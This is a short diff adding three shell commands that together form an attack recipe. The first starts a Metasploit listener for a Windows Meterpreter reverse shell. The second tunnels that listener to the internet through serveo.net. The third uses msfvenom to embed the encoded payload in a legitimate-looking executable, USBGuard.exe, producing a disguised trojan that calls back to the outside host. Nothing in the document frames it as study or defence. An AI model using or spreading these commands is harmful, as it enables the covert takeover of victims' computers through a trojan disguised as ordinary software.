@@ -1,0 +1,4 @@
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT 24731;set EXITFUNC thread; run"
+ssh -R 5445:0.0.0.0:24731 serveo.net
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=5445 -e x86/shikata_ga_nai -f exe -x '/root/Desktop/USBGuard.exe' -i 9 -o USBGuardsvoi.exe EXITFUNC=thread
+
